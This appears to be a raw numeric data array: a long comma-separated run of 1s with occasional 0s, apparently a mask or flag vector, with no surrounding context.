1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 